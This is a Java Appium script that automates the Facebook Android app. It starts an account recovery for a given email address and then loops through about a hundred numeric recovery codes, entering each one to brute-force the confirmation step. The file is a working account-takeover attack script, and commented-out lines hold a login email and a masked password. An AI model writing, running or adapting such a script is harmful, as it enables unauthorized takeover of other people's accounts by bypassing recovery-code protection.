package appiumtest;

import java.net.MalformedURLException;
import java.net.URL;

import org.openqa.selenium.By;
import org.openqa.selenium.remote.DesiredCapabilities;
import io.appium.java_client.AppiumDriver;
import io.appium.java_client.MobileElement;
import io.appium.java_client.android.AndroidDriver;
 
public class AppiumAutoFacebook {
	//
	
	public static void main(String[] args) throws InterruptedException {
		
		//Set the Desired Capabilities
		DesiredCapabilities caps = new DesiredCapabilities();
		caps.setCapability("deviceName", "Viki");
		caps.setCapability("udid", "32040ee4cf5d31a3"); //Give Device ID of your mobile phone
		caps.setCapability("platformName", "Android");
		caps.setCapability("platformVersion", "5.1.1");
		caps.setCapability("appPackage", "com.facebook.katana");
		caps.setCapability("appActivity", "com.facebook.katana.LoginActivity");
		//caps.setCapability("appActivity", "com.facebook.account.recovery.AccountRecoveryActivity");
		//caps.setCapability("'appWaitActivity", "com.facebook.katana.LoginActivity");
		
		caps.setCapability("noReset", "true");
		
		//Instantiate Appium Drivers
		try {
				AppiumDriver<MobileElement> driver = new AndroidDriver<MobileElement>(new URL("http://127.0.0.1:4723/wd/hub"), caps);
				Thread.sleep(5000);
				//driver.findElement(By.id("com.facebook.katana:id/login_username")).click();
				//driver.findElement(By.id("com.facebook.katana:id/login_username")).sendKeys("blueonelove82@gmail.com");
				//Thread.sleep(5000);
				//driver.findElement(By.id("com.facebook.katana:id/login_password")).click();
				//driver.findElement(By.id("com.facebook.katana:id/login_password")).sendKeys("xxxxxxxx$xxx");
				//Thread.sleep(5000);
				//driver.findElement(By.id("com.facebook.katana:id/login_login")).click();
				driver.findElement(By.id("com.facebook.katana:id/login_forgot_password")).click();
				Thread.sleep(5000);
				driver.findElement(By.id("com.facebook.katana:id/not_my_account_button")).click();
				Thread.sleep(5000);
				driver.findElement(By.id("com.facebook.katana:id/account_recovery_search_edit_text")).click();
				Thread.sleep(5000);
				driver.findElement(By.id("com.facebook.katana:id/account_recovery_search_edit_text")).sendKeys("onlyfortest1901@gmail.com");
				Thread.sleep(5000);
				driver.findElement(By.id("com.facebook.katana:id/account_recovery_search_button")).click();
				Thread.sleep(5000);
				driver.findElement(By.id("com.facebook.katana:id/continue_button")).click();
				Thread.sleep(10000);
				for(int i=537000; i<= 537100; i++)
				{
					String confirmcode = Integer.toString(i);
				driver.findElement(By.id("com.facebook.katana:id/confirm_code")).sendKeys(confirmcode);
				System.out.println(confirmcode);
				Thread.sleep(5000);
				driver.findElement(By.id("com.facebook.katana:id/account_recovery_continue_button")).click();
				Thread.sleep(5000);
				driver.findElement(By.id("com.facebook.katana:id/button1")).click();
				
				}
			
		} catch (MalformedURLException e) {
			System.out.println(e.getMessage());
		}
	}
 
}